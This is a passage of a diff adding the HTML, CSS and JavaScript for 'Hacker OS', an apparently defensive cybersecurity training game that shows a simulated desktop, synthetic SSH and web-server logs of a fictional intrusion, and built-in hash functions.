@@ -1,0 +1,1695 @@
+<!doctype html>
+<html lang="en" data-theme="cyber">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>Hacker OS</title>
+<meta name="description" content="A story game where you learn real Linux, log analysis and incident response by defending a hacked company on a simulated desktop.">
+<meta name="theme-color" content="#070a14">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;800&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+<style>
+:root, [data-theme="cyber"] {
+  --bg:#070a14; --panel:rgba(14,19,38,.95); --line:rgba(120,160,255,.18);
+  --text:#dfe8ff; --muted:#7f8bb0; --acc:#ff3e9a; --acc2:#22e6ff; --ok:#3dff9a; --warn:#ffd23a; --bad:#ff4d6d; --blue:#5b9dff;
+  --term:#060912; --prompt:#3dff9a; --path:#22e6ff; --glow:rgba(255,62,154,.25);
+  --wall: radial-gradient(1200px 600px at 80% -10%, rgba(255,62,154,.22), transparent 60%), radial-gradient(900px 600px at -10% 110%, rgba(34,230,255,.18), transparent 60%), linear-gradient(160deg,#070a14,#0c0f22 60%,#120a1f);
+}
+[data-theme="matrix"] {
+  --bg:#020803; --panel:rgba(4,16,7,.96); --line:rgba(61,255,120,.2);
+  --text:#c8ffd4; --muted:#5f9a6c; --acc:#3dff7a; --acc2:#9dffb5; --ok:#3dff7a; --warn:#e8ff5a; --bad:#ff5a5a; --blue:#9dffb5;
+  --term:#010602; --prompt:#3dff7a; --path:#9dffb5; --glow:rgba(61,255,122,.22);
+  --wall: radial-gradient(1000px 600px at 50% -20%, rgba(61,255,122,.16), transparent 60%), linear-gradient(180deg,#020803,#031006);
+}
+[data-theme="amber"] {
+  --bg:#0f0a03; --panel:rgba(24,16,5,.96); --line:rgba(255,176,46,.22);
+  --text:#ffe2b0; --muted:#a8865a; --acc:#ffb02e; --acc2:#ffd27a; --ok:#ffcf5a; --warn:#fff07a; --bad:#ff6a3d; --blue:#ffd27a;
+  --term:#0b0702; --prompt:#ffb02e; --path:#ffd27a; --glow:rgba(255,176,46,.22);
+  --wall: radial-gradient(1000px 600px at 50% -20%, rgba(255,176,46,.16), transparent 60%), linear-gradient(180deg,#0f0a03,#160e04);
+}
+* { box-sizing:border-box; }
+html,body { margin:0; height:100%; background:var(--bg); color:var(--text); font-family:Inter,system-ui,-apple-system,"Segoe UI",sans-serif; overflow:hidden; }
+code, kbd, pre { font-family:"JetBrains Mono",ui-monospace,Menlo,Consolas,monospace; }
+code { background:rgba(255,255,255,.08); border:1px solid var(--line); padding:1px 5px; border-radius:5px; font-size:.9em; color:var(--acc2); }
+button { font:inherit; color:inherit; cursor:pointer; }
+a { color:var(--acc2); }
+.hidden { display:none !important; }
+#desktop { position:fixed; inset:0; background:var(--wall); }
+#desktop::after { content:""; position:absolute; inset:0; pointer-events:none; background:repeating-linear-gradient(0deg, rgba(255,255,255,.016) 0 1px, transparent 1px 3px); }
+#topbar { position:absolute; top:0; left:0; right:0; height:38px; display:flex; align-items:center; gap:12px; padding:0 12px;
+  background:rgba(5,7,15,.78); border-bottom:1px solid var(--line); backdrop-filter:blur(8px); z-index:900; font-size:13px; }
+#topbar .logo { font-family:"JetBrains Mono",monospace; font-weight:800; color:var(--acc); letter-spacing:1px; text-shadow:0 0 10px var(--glow); white-space:nowrap; }
+#topbar .sp { flex:1; }
+#rank { font-weight:800; color:var(--acc2); white-space:nowrap; }
+#xpbar { width:110px; height:6px; border-radius:4px; background:rgba(255,255,255,.1); overflow:hidden; }
+#xpfill { display:block; height:100%; width:0; background:linear-gradient(90deg,var(--acc2),var(--acc)); transition:width .6s; }
+#xptxt, #clock { color:var(--muted); font-size:11px; font-family:"JetBrains Mono",monospace; white-space:nowrap; }
+.tbtn { background:none; border:0; padding:6px 8px; border-radius:8px; color:var(--muted); }
+.tbtn:hover { background:rgba(255,255,255,.08); color:var(--text); }
+#icons { position:absolute; top:54px; left:12px; display:flex; flex-direction:column; gap:4px; z-index:1; }
+.dicon { width:84px; padding:8px 4px; border-radius:12px; text-align:center; background:none; border:1px solid transparent; font-size:12px; position:relative; }
+.dicon:hover { background:rgba(255,255,255,.06); border-color:var(--line); }
+.dicon .ic { font-size:28px; display:block; margin-bottom:4px; filter:drop-shadow(0 0 8px var(--glow)); }
+.badge { position:absolute; top:2px; right:12px; min-width:18px; height:18px; border-radius:9px; background:var(--acc); color:#000; font-size:11px; font-weight:800; line-height:18px; padding:0 5px; }
+.win { position:absolute; display:flex; flex-direction:column; background:var(--panel); border:1px solid var(--line); border-radius:12px;
+  box-shadow:0 20px 60px rgba(0,0,0,.55), 0 0 30px var(--glow); overflow:hidden; min-width:280px; min-height:180px; z-index:10; }
+.win.focus { border-color:var(--acc); }
+.win .bar { height:36px; flex:none; display:flex; align-items:center; gap:8px; padding:0 10px; background:rgba(255,255,255,.04); border-bottom:1px solid var(--line); cursor:grab; user-select:none; touch-action:none; }
+.win .dots { display:flex; gap:6px; }
+.win .dots i { width:12px; height:12px; border-radius:50%; display:block; cursor:pointer; }
+.win .dots i:nth-child(1) { background:#ff5f57; } .win .dots i:nth-child(2) { background:#febc2e; } .win .dots i:nth-child(3) { background:#28c840; }
+.win .title { flex:1; text-align:center; font-size:12px; color:var(--muted); font-weight:600; margin-right:50px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; }
+.win .body { flex:1; overflow:auto; position:relative; min-height:0; }
+.win .rs { position:absolute; right:0; bottom:0; width:16px; height:16px; cursor:nwse-resize; touch-action:none; }
+.win.max { left:0 !important; top:38px !important; width:100% !important; height:calc(100% - 38px - 70px) !important; border-radius:0; }
+#w-term .body { background:var(--term); display:flex; flex-direction:column; overflow:hidden; }
+#termwrap { flex:1; overflow:auto; padding:12px 14px 8px; font-family:"JetBrains Mono",monospace; font-size:13.5px; line-height:1.5; cursor:text; }
+#termout > div { white-space:pre-wrap; word-break:break-word; min-height:1.5em; }
+#termline { display:flex; }
+#ps { white-space:pre; }
+#tin { flex:1; background:none; border:0; outline:0; color:var(--text); font:inherit; padding:0; min-width:20px; caret-color:var(--acc); }
+#tin.pw { color:transparent; }
+.ps-u { color:var(--prompt); font-weight:600; } .ps-p { color:var(--path); font-weight:600; }
+.c31 { color:var(--bad); } .c32 { color:var(--ok); } .c33 { color:var(--warn); } .c34 { color:var(--blue); } .c35 { color:var(--acc); } .c36 { color:var(--acc2); } .c90 { color:var(--muted); } .c1 { font-weight:800; }
+#termtools { flex:none; display:flex; gap:6px; padding:6px 10px; border-top:1px solid var(--line); background:rgba(255,255,255,.02); flex-wrap:wrap; align-items:center; }
+#termtools button { background:rgba(255,255,255,.06); border:1px solid var(--line); border-radius:8px; padding:5px 10px; font-size:12px; font-family:"JetBrains Mono",monospace; }
+#termtools button:hover { border-color:var(--acc); }
+#meter { margin-left:auto; display:flex; align-items:center; gap:8px; font-size:11px; font-family:"JetBrains Mono",monospace; color:var(--bad); }
+#meter .tb { width:120px; height:8px; border-radius:4px; background:rgba(255,77,109,.15); overflow:hidden; }
+#meter .tf { display:block; height:100%; width:0; background:var(--bad); box-shadow:0 0 10px var(--bad); transition:width .3s; }
+#chat { padding:14px; display:flex; flex-direction:column; gap:10px; }
+.msg { max-width:90%; padding:10px 12px; border-radius:12px; font-size:14px; line-height:1.55; background:rgba(255,255,255,.05); border:1px solid var(--line); animation:pop .25s ease-out; }
+.msg .who { font-size:11px; font-weight:800; color:var(--acc); margin-bottom:3px; letter-spacing:1px; }
+.msg.me { align-self:flex-end; } .msg.me .who { color:var(--acc2); }
+.msg.sys { align-self:center; background:none; border:0; color:var(--muted); font-size:12px; text-align:center; padding:2px; }
+.typing { color:var(--muted); font-size:12px; padding-left:4px; }
+@keyframes pop { from { transform:translateY(6px); opacity:0; } }
+#mail { display:flex; height:100%; }
+#mlist { width:38%; min-width:150px; border-right:1px solid var(--line); overflow:auto; }
+.mi { padding:10px 12px; border-bottom:1px solid var(--line); cursor:pointer; font-size:13px; }
+.mi:hover, .mi.on { background:rgba(255,255,255,.05); }
+.mi b { display:block; font-size:12px; } .mi span { color:var(--muted); font-size:12px; }
+.mi.unread b::before { content:"● "; color:var(--acc); }
+#mview { flex:1; overflow:auto; padding:16px 18px; font-size:14px; line-height:1.6; }
+#mview h3 { margin:0 0 4px; } #mview .meta { color:var(--muted); font-size:12px; margin-bottom:14px; }
+#notes, #missions, #settings { padding:14px 16px; font-size:14px; }
+.note { border:1px solid var(--line); border-radius:10px; padding:10px 12px; margin-bottom:10px; background:rgba(255,255,255,.03); cursor:pointer; }
+.note h4 { margin:0 0 4px; font-size:14px; color:var(--acc2); font-family:"JetBrains Mono",monospace; }
+.note p { margin:0; font-size:13px; line-height:1.5; }
+.empty { color:var(--muted); text-align:center; padding:30px 10px; font-size:13px; }
+.chap { color:var(--muted); font-size:11px; letter-spacing:2px; font-weight:800; margin:14px 0 6px; }
+.mrow { display:flex; align-items:center; gap:10px; padding:7px 10px; border-radius:10px; border:1px solid transparent; }
+.mrow.cur { border-color:var(--acc); background:rgba(255,255,255,.04); }
+.mrow.lock { opacity:.4; }
+.mrow .st { width:22px; text-align:center; }
+.mrow small { margin-left:auto; color:var(--muted); font-size:11px; white-space:nowrap; }
+.objs { margin:6px 0 4px 32px; padding:0; list-style:none; font-size:13px; }
+.objs li { padding:3px 0; color:var(--muted); }
+.objs li.done { color:var(--ok); }
+.objs li.now { color:var(--text); font-weight:600; }
+.hintbtn, .opt { background:rgba(255,255,255,.06); border:1px solid var(--line); border-radius:8px; padding:7px 12px; font-size:12px; }
+.hintbtn { margin:8px 0 0 32px; }
+#settings h4 { margin:14px 0 8px; font-size:12px; letter-spacing:2px; color:var(--muted); }
+.opt { margin:0 6px 6px 0; font-size:13px; }
+.opt.on { border-color:var(--acc); color:var(--acc); }
+.danger { border-color:var(--bad); color:var(--bad); }
+#dock { position:absolute; bottom:max(8px,env(safe-area-inset-bottom)); left:50%; transform:translateX(-50%); display:flex; gap:6px; padding:6px 8px; border-radius:16px;
+  background:rgba(5,7,15,.75); border:1px solid var(--line); backdrop-filter:blur(10px); z-index:900; }
+#dock button { width:46px; height:46px; border-radius:12px; border:0; background:rgba(255,255,255,.04); font-size:22px; position:relative; transition:transform .12s; }
+#dock button:hover { transform:translateY(-4px); background:rgba(255,255,255,.1); }
+#dock button.open::after { content:""; position:absolute; bottom:2px; left:50%; width:4px; height:4px; margin-left:-2px; border-radius:50%; background:var(--acc2); }
+#dock .badge { top:-4px; right:-4px; }
+#toasts { position:fixed; top:46px; right:12px; z-index:2000; display:flex; flex-direction:column; gap:8px; pointer-events:none; }
+.toast { background:var(--panel); border:1px solid var(--line); border-left:3px solid var(--acc); border-radius:10px; padding:10px 14px; font-size:13px; box-shadow:0 8px 30px rgba(0,0,0,.5); animation:tin .3s ease-out; max-width:300px; }
+.toast.ok { border-left-color:var(--ok); }
+@keyframes tin { from { transform:translateX(30px); opacity:0; } }
+.modal { position:fixed; inset:0; z-index:3000; display:flex; align-items:center; justify-content:center; padding:16px; background:rgba(0,0,0,.55); backdrop-filter:blur(3px); }
+.cbox { width:100%; max-width:540px; background:var(--panel); border:1px solid var(--acc2); border-radius:16px; padding:22px; box-shadow:0 0 50px var(--glow); animation:pop .3s; max-height:90vh; overflow:auto; }
+.cbox .tag { font-size:11px; letter-spacing:2px; font-weight:800; color:var(--acc2); }
+.cbox h2 { margin:6px 0 6px; font-family:"JetBrains Mono",monospace; color:var(--acc); }
+.cbox .what { font-size:15px; margin:0 0 12px; line-height:1.5; }
+.cbox .real { background:rgba(255,255,255,.04); border:1px solid var(--line); border-radius:10px; padding:12px 14px; font-size:13.5px; line-height:1.65; }
+.cbox .real b { color:var(--warn); }
+.cbox pre { background:var(--term); border:1px solid var(--line); border-radius:10px; padding:10px 12px; font-size:13px; overflow:auto; margin:12px 0 0; color:var(--ok); }
+.cbox .go { margin-top:16px; width:100%; padding:12px; border-radius:10px; border:0; font-weight:800; background:linear-gradient(90deg,var(--acc2),var(--acc)); color:#000; letter-spacing:1px; }
+#boot { position:fixed; inset:0; background:#000; z-index:5000; padding:20px; font-family:"JetBrains Mono",monospace; font-size:13px; color:#9fb; overflow:hidden; white-space:pre-wrap; }
+#login { position:fixed; inset:0; z-index:4500; display:flex; align-items:center; justify-content:center; background:var(--wall); padding:16px; }
+#login .lbox { width:100%; max-width:400px; text-align:center; background:var(--panel); border:1px solid var(--line); border-radius:18px; padding:30px 24px; box-shadow:0 0 60px var(--glow); }
+#login .av { width:84px; height:84px; margin:0 auto 14px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:40px; background:rgba(255,255,255,.05); border:2px solid var(--acc); box-shadow:0 0 30px var(--glow); }
+#login h1 { margin:0; font-family:"JetBrains Mono",monospace; font-size:26px; color:var(--acc); letter-spacing:2px; }
+#login p { color:var(--muted); font-size:13px; line-height:1.6; }
+#login input { width:100%; padding:13px 14px; border-radius:10px; border:1px solid var(--line); background:rgba(0,0,0,.35); color:var(--text); font:600 16px "JetBrains Mono",monospace; outline:0; text-align:center; }
+#login input:focus { border-color:var(--acc); }
+#login button { width:100%; margin-top:12px; padding:13px; border-radius:10px; border:0; font-weight:800; letter-spacing:2px; background:linear-gradient(90deg,var(--acc2),var(--acc)); color:#000; }
+.glitch { animation:gl 2.5s infinite; }
+@keyframes gl { 0%,92%,100% { transform:none; } 93% { transform:translate(-2px,1px); text-shadow:2px 0 var(--acc2),-2px 0 var(--acc); } 96% { transform:translate(2px,-1px); text-shadow:-2px 0 var(--acc2),2px 0 var(--acc); } }
+@media (max-width:760px) {
+  #icons { display:none; }
+  .win { left:0 !important; top:38px !important; width:100% !important; height:calc(100% - 38px - 70px) !important; border-radius:0; border-left:0; border-right:0; }
+  .win .rs { display:none; } .win .bar { cursor:default; }
+  #xpbar, #clock { display:none; }
+  #termwrap { font-size:12.5px; }
+  #mail { flex-direction:column; } #mlist { width:100%; max-height:40%; border-right:0; border-bottom:1px solid var(--line); }
+}
+</style>
+</head>
+<body>
+<div id="boot" class="hidden"></div>
+
+<div id="login" class="hidden">
+  <div class="lbox">
+    <div class="av">🛡️</div>
+    <h1 class="glitch">NULLSEC</h1>
+    <p>Welcome to your first day at <b style="color:var(--text)">NULLSEC</b>, a security team that helps companies after they get hacked.<br>Choose your analyst name to log in.</p>
+    <input id="handle" maxlength="16" placeholder="your name" autocomplete="off" spellcheck="false">
+    <button id="loginBtn">LOG IN</button>
+    <p style="font-size:11px;margin-top:14px">Everything here is simulated: the companies, people and computers are made up. The commands are real and work on Linux and macOS.<br><a href="./" style="color:var(--muted)">← more games</a></p>
+  </div>
+</div>
+
+<div id="desktop" class="hidden">
+  <div id="topbar">
+    <span class="logo">◢ NULLSEC OS</span>
+    <span class="sp"></span>
+    <span id="rank">Trainee</span><span id="xpbar"><span id="xpfill"></span></span><span id="xptxt">0 XP</span>
+    <button class="tbtn" id="sndBtn" title="Sound">🔊</button>
+    <span id="clock"></span>
+  </div>
+  <div id="icons"></div>
+
+  <div class="win" id="w-term">
+    <div class="bar"><span class="dots"><i data-a="close"></i><i data-a="close"></i><i data-a="max"></i></span><span class="title" id="termtitle">Terminal</span></div>
+    <div class="body">
+      <div id="termwrap"><div id="termout"></div><div id="termline"><span id="ps"></span><input id="tin" autocomplete="off" autocapitalize="off" autocorrect="off" spellcheck="false" enterkeyhint="send" aria-label="terminal input"></div></div>
+      <div id="termtools">
+        <button data-k="tab">Tab</button><button data-k="up">↑</button><button data-k="ctrlc">Ctrl+C</button><button data-k="clear">clear</button><button data-k="hint">💡 hint</button>
+        <span id="meter" class="hidden"><span id="meterlbl">SERVER LOAD</span> <span class="tb"><span class="tf" id="meterf"></span></span><span id="meterp">0%</span></span>
+      </div>
+    </div>
+    <div class="rs"></div>
+  </div>
+
+  <div class="win" id="w-chat">
+    <div class="bar"><span class="dots"><i data-a="close"></i><i data-a="close"></i><i data-a="max"></i></span><span class="title">👻 Ghost · team chat</span></div>
+    <div class="body"><div id="chat"></div></div>
+    <div class="rs"></div>
+  </div>
+
+  <div class="win hidden" id="w-mail">
+    <div class="bar"><span class="dots"><i data-a="close"></i><i data-a="close"></i><i data-a="max"></i></span><span class="title">✉️ Mail</span></div>
+    <div class="body"><div id="mail"><div id="mlist"></div><div id="mview"><div class="empty">Pick a message.</div></div></div></div>
+    <div class="rs"></div>
+  </div>
+
+  <div class="win hidden" id="w-notes">
+    <div class="bar"><span class="dots"><i data-a="close"></i><i data-a="close"></i><i data-a="max"></i></span><span class="title">📘 Notes · your cheat sheet</span></div>
+    <div class="body"><div id="notes"></div></div>
+    <div class="rs"></div>
+  </div>
+
+  <div class="win hidden" id="w-missions">
+    <div class="bar"><span class="dots"><i data-a="close"></i><i data-a="close"></i><i data-a="max"></i></span><span class="title">🎯 Missions</span></div>
+    <div class="body"><div id="missions"></div></div>
+    <div class="rs"></div>
+  </div>
+
+  <div class="win hidden" id="w-settings">
+    <div class="bar"><span class="dots"><i data-a="close"></i><i data-a="close"></i><i data-a="max"></i></span><span class="title">⚙️ Settings</span></div>
+    <div class="body"><div id="settings">
+      <h4>THEME</h4><div id="themes"></div>
+      <h4>SOUND</h4><button class="opt" id="sndOpt">Sound: on</button>
+      <h4>PROGRESS</h4><button class="opt danger" id="resetBtn">Delete progress and start over</button>
+      <h4>ABOUT</h4><p style="color:var(--muted);font-size:13px;line-height:1.6">Hacker OS is a game about <b>defending</b> computers. Every company, person and server in it is made up, and nothing you type leaves your browser.
+      The commands are real: try them on Linux, macOS, or Windows with WSL.<br><a href="https://github.com/y4sh-0day/Top">⭐ GitHub</a> · <a href="./">More games</a></p>
+    </div></div>
+    <div class="rs"></div>
+  </div>
+
+  <div id="dock"></div>
+</div>
+
+<div id="toasts"></div>
+<div id="card" class="modal hidden"><div class="cbox" id="cardbox"></div></div>
+<script>
+(() => {
+'use strict';
+const $ = id => document.getElementById(id);
+const esc = s => String(s).replace(/[&<>"]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
+const sleep = ms => new Promise(r => setTimeout(r, ms));
+const pad2 = n => String(n).padStart(2, '0');
+
+/* ============ save ============ */
+const SAVE_KEY = 'hackeros.v1';
+const DEF = { handle: '', user: '', mi: 0, oi: 0, xp: 0, learned: [], mails: [], readMail: [], chat: [], theme: 'cyber', sound: true, hintStep: {}, done: false, lw: {} };
+let S;
+try { S = Object.assign({}, DEF, JSON.parse(localStorage.getItem(SAVE_KEY) || '{}')); } catch (e) { S = Object.assign({}, DEF); }
+function save() { try { localStorage.setItem(SAVE_KEY, JSON.stringify(S)); } catch (e) {} }
+const fmt = s => String(s).replace(/\{h\}/g, S.handle || 'rookie').replace(/\{u\}/g, S.user || 'rookie');
+const md = s => esc(fmt(s)).replace(/`([^`]+)`/g, '<code>$1</code>').replace(/\*\*([^*]+)\*\*/g, '<b>$1</b>').replace(/\n/g, '<br>');
+
+/* ============ sound ============ */
+let AC = null;
+function au() { if (!S.sound) return null; try { if (!AC) AC = new (window.AudioContext || window.webkitAudioContext)(); if (AC.state === 'suspended') AC.resume(); } catch (e) { return null; } return AC; }
+function beep(f, d, type = 'sine', v = 0.06, delay = 0) {
+  const a = au(); if (!a) return;
+  const t = a.currentTime + delay, o = a.createOscillator(), g = a.createGain();
+  o.type = type; o.frequency.setValueAtTime(f, t); g.gain.setValueAtTime(v, t); g.gain.exponentialRampToValueAtTime(0.0005, t + d);
+  o.connect(g); g.connect(a.destination); o.start(t); o.stop(t + d + 0.02);
+}
+const SND = {
+  ok: () => { beep(660, 0.12, 'triangle', 0.08); beep(990, 0.18, 'triangle', 0.08, 0.09); },
+  mission: () => [523, 659, 784, 1047, 1319].forEach((f, i) => beep(f, 0.2, 'triangle', 0.07, i * 0.08)),
+  bad: () => beep(140, 0.18, 'square', 0.05),
+  msg: () => { beep(880, 0.07, 'sine', 0.05); beep(1175, 0.1, 'sine', 0.04, 0.07); },
+  mail: () => { beep(740, 0.1, 'sine', 0.05); beep(554, 0.16, 'sine', 0.04, 0.1); },
+  alarm: () => { beep(440, 0.15, 'sawtooth', 0.05); beep(330, 0.2, 'sawtooth', 0.05, 0.16); },
+};
+
+/* ============ real MD5 + SHA-256 ============ */
+const utf8 = s => unescape(encodeURIComponent(s));
+function md5(str) {
+  const s = utf8(str), K = [], R = [7, 12, 17, 22, 5, 9, 14, 20, 4, 11, 16, 23, 6, 10, 15, 21];
+  for (let i = 0; i < 64; i++) K[i] = Math.floor(Math.abs(Math.sin(i + 1)) * 4294967296) | 0;
+  const n = s.length, w = [];
+  for (let i = 0; i < n; i++) w[i >> 2] |= s.charCodeAt(i) << ((i % 4) * 8);
+  w[n >> 2] |= 0x80 << ((n % 4) * 8);
+  const nw = (((n + 8) >> 6) + 1) * 16;
+  for (let i = 0; i < nw; i++) w[i] = w[i] | 0;
+  w[nw - 2] = n * 8;
+  let a0 = 0x67452301, b0 = 0xefcdab89 | 0, c0 = 0x98badcfe | 0, d0 = 0x10325476;
+  for (let i = 0; i < nw; i += 16) {
+    let A = a0, B = b0, C = c0, D = d0;
+    for (let j = 0; j < 64; j++) {
+      let F, g;
+      if (j < 16) { F = (B & C) | (~B & D); g = j; }
+      else if (j < 32) { F = (D & B) | (~D & C); g = (5 * j + 1) % 16; }
+      else if (j < 48) { F = B ^ C ^ D; g = (3 * j + 5) % 16; }
+      else { F = C ^ (B | ~D); g = (7 * j) % 16; }
+      const tmp = D; D = C; C = B;
+      const x = (A + F + K[j] + w[i + g]) | 0, sh = R[(j >> 4) * 4 + (j % 4)];
+      B = (B + ((x << sh) | (x >>> (32 - sh)))) | 0; A = tmp;
+    }
+    a0 = (a0 + A) | 0; b0 = (b0 + B) | 0; c0 = (c0 + C) | 0; d0 = (d0 + D) | 0;
+  }
+  return [a0, b0, c0, d0].map(v => { let h = ''; for (let i = 0; i < 4; i++) h += ((v >>> (i * 8)) & 255).toString(16).padStart(2, '0'); return h; }).join('');
+}
+function sha256(str) {
+  const s = utf8(str), K = [], isP = n => { for (let i = 2; i * i <= n; i++) if (n % i === 0) return false; return true; };
+  let H = [], n = 2, c = 0; const frac = x => ((x - Math.floor(x)) * 4294967296) | 0;
+  while (c < 64) { if (isP(n)) { if (c < 8) H[c] = frac(Math.pow(n, 1 / 2)); K[c] = frac(Math.pow(n, 1 / 3)); c++; } n++; }
+  const l = s.length, w = [];
+  for (let i = 0; i < l; i++) w[i >> 2] |= s.charCodeAt(i) << (24 - (i % 4) * 8);
+  w[l >> 2] |= 0x80 << (24 - (l % 4) * 8);
+  const nw = (((l + 8) >> 6) + 1) * 16; for (let i = 0; i < nw; i++) w[i] = w[i] | 0; w[nw - 1] = l * 8;
+  const W = new Array(64), rotr = (x, k) => (x >>> k) | (x << (32 - k));
+  for (let i = 0; i < nw; i += 16) {
+    let [a, b, c2, d, e, f, g, h] = H;
+    for (let j = 0; j < 64; j++) {
+      if (j < 16) W[j] = w[i + j];
+      else { const s0 = rotr(W[j - 15], 7) ^ rotr(W[j - 15], 18) ^ (W[j - 15] >>> 3), s1 = rotr(W[j - 2], 17) ^ rotr(W[j - 2], 19) ^ (W[j - 2] >>> 10); W[j] = (W[j - 16] + s0 + W[j - 7] + s1) | 0; }
+      const S1 = rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25), ch = (e & f) ^ (~e & g), t1 = (h + S1 + ch + K[j] + W[j]) | 0;
+      const S0 = rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22), maj = (a & b) ^ (a & c2) ^ (b & c2), t2 = (S0 + maj) | 0;
+      h = g; g = f; f = e; e = (d + t1) | 0; d = c2; c2 = b; b = a; a = (t1 + t2) | 0;
+    }
+    H = [H[0] + a, H[1] + b, H[2] + c2, H[3] + d, H[4] + e, H[5] + f, H[6] + g, H[7] + h].map(v => v | 0);
+  }
+  return H.map(v => (v >>> 0).toString(16).padStart(8, '0')).join('');
+}
+const toB64 = s => btoa(utf8(s));
+const fromB64 = s => decodeURIComponent(escape(atob(s.replace(/\s+/g, ''))));
+const rot13 = s => s.replace(/[a-z]/gi, c => { const b = c <= 'Z' ? 65 : 97; return String.fromCharCode((c.charCodeAt(0) - b + 13) % 26 + b); });
+const toHex = s => Array.from(utf8(s)).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
+
+/* ============ case data ============ */
+function rng(seed) { return () => { seed |= 0; seed = seed + 0x6D2B79F5 | 0; let t = Math.imul(seed ^ seed >>> 15, 1 | seed); t = t + Math.imul(t ^ t >>> 7, 61 | t) ^ t; return ((t ^ t >>> 14) >>> 0) / 4294967296; }; }
+const ATTACKER = '198.51.100.23', C2 = '203.0.113.99', MINER_PID = 4127;
+function genAccessLog() {
+  const r = rng(1337), pick = a => a[Math.floor(r() * a.length)];
+  const paths = ['/', '/index.html', '/about', '/careers', '/products/arm-x2', '/products/rover', '/api/v1/status', '/static/app.js', '/static/style.css', '/img/logo.svg', '/blog/hello-robots', '/support', '/news', '/favicon.ico', '/robots.txt', '/contact'];
+  const agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4)', 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2)', 'curl/8.4.0', 'Googlebot/2.1'];
+  const lines = [];
+  for (let i = 0; i < 1500; i++) {
+    const sec = 3600 + i * 17 + Math.floor(r() * 10), hh = Math.floor(sec / 3600) % 24, mm = Math.floor(sec / 60) % 60, ss = sec % 60;
+    let ip = `${pick([10, 172, 203, 192, 81])}.${Math.floor(r() * 255)}.${Math.floor(r() * 255)}.${Math.floor(r() * 254) + 1}`;
+    let p = pick(paths), m = r() < 0.88 ? 'GET' : 'POST', st = r() < 0.92 ? 200 : pick([301, 404, 500]), ag = pick(agents);
+    if (i === 640) { p = '/backup.zip'; st = 404; ip = ATTACKER; ag = 'dirscanner/1.2'; }
+    if (i === 641) { p = '/old/'; st = 404; ip = ATTACKER; ag = 'dirscanner/1.2'; }
+    if (i === 642) { p = '/site_backup.bak'; st = 200; ip = ATTACKER; ag = 'dirscanner/1.2'; }
+    lines.push(`${ip} - - [14/Mar/2024:${pad2(hh)}:${pad2(mm)}:${pad2(ss)} +0000] "${m} ${p} HTTP/1.1" ${st} ${200 + Math.floor(r() * 9000)} "-" "${ag}"`);
+  }
+  return lines.join('\n') + '\n';
+}
+let FAIL_TOTAL = 0, FAIL_ATTACKER = 0;
+function genAuthLog() {
+  const r = rng(4242), pick = a => a[Math.floor(r() * a.length)], lines = [];
+  const ips = ['203.0.113.7', '203.0.113.66', '192.0.2.144', '45.33.12.9', ATTACKER, ATTACKER, ATTACKER];
+  const users = ['root', 'admin', 'test', 'ubuntu', 'oracle', 'svc_deploy', 'postgres', 'guest'];
+  FAIL_TOTAL = 0; FAIL_ATTACKER = 0;
+  for (let i = 0; i < 640; i++) {
+    const sec = 7200 + i * 13, hh = Math.floor(sec / 3600) % 24, mm = Math.floor(sec / 60) % 60, ss = sec % 60, ts = `Mar 14 ${pad2(hh)}:${pad2(mm)}:${pad2(ss)} lumen-web`;
+    const x = r(), pid = 1000 + Math.floor(r() * 8000);
+    if (i === 600) { lines.push(`${ts} sshd[${pid}]: Accepted password for svc_deploy from ${ATTACKER} port 52211 ssh2`); continue; }
+    if (x < 0.62) {
+      const ip = pick(ips); FAIL_TOTAL++; if (ip === ATTACKER) FAIL_ATTACKER++;
+      lines.push(`${ts} sshd[${pid}]: Failed password for ${r() < 0.2 ? 'invalid user ' : ''}${pick(users)} from ${ip} port ${30000 + Math.floor(r() * 30000)} ssh2`);
+    } else if (x < 0.72) lines.push(`${ts} sshd[${pid}]: Accepted publickey for admin from 10.20.0.2 port ${40000 + Math.floor(r() * 20000)} ssh2`);
+    else if (x < 0.88) lines.push(`${ts} CRON[${pid}]: pam_unix(cron:session): session opened for user root by (uid=0)`);
+    else lines.push(`${ts} sshd[${pid}]: Connection closed by ${pick(ips)} port ${30000 + Math.floor(r() * 30000)} [preauth]`);
+  }
+  return lines.join('\n') + '\n';
+}
+const BIN_GOOD = { nginx: 'ELF64 nginx/1.24.0 build 7f1c ok', sshd: 'ELF64 OpenSSH_8.9p1 build 22aa ok', ls: 'ELF64 coreutils 9.1 ls build 0b3e ok' };
+const BIN_NOW = Object.assign({}, BIN_GOOD, { nginx: 'ELF64 nginx/1.24.0 build 7f1c ok +hook(/tmp/.cache)' });
+
+/* ============ file systems ============ */
+function mk(obj, own) {
+  if (typeof obj === 'string') return { t: 'f', s: obj, own: own || 'user', mode: '644' };
+  const node = { t: 'd', c: {}, own: own || 'user', mode: '755' };
+  for (const k of Object.keys(obj)) {
+    if (k === '$deny') { node.deny = true; continue; }
+    if (k === '$own') { node.own = obj[k]; continue; }
+    const v = obj[k];
+    node.c[k] = mk(v, (v && typeof v === 'object' && v.$own) || node.own);
+  }
+  return node;
+}
+function buildLaptop(u, h) {
+  const filler = n => Array.from({ length: n }, (_, i) => `line ${i + 1}: nothing useful here`).join('\n') + '\n';
+  const known = Object.keys(BIN_GOOD).map(k => `${sha256(BIN_GOOD[k])}  bin/${k}`).join('\n') + '\n';
+  const fs = mk({
+    home: { [u]: {
+      'welcome.txt': `Welcome to NULLSEC, ${h}.\n\nThis laptop is your workspace. It's a simulation, so you can't break\nanything. Explore. Type commands. Make mistakes. That's how you learn.\n\nYour mentor Ghost will message you in the chat window.\nType  help  any time to see the commands you can use.\n`,
+      '.bashrc': `# ~/.bashrc runs every time you open a terminal\nalias ll='ls -la'\n# Ghost was here\n`,
+      Documents: {
+        'todo.txt': `- learn linux properly\n- stop using password123 everywhere\n- don't be late on day one\n`,
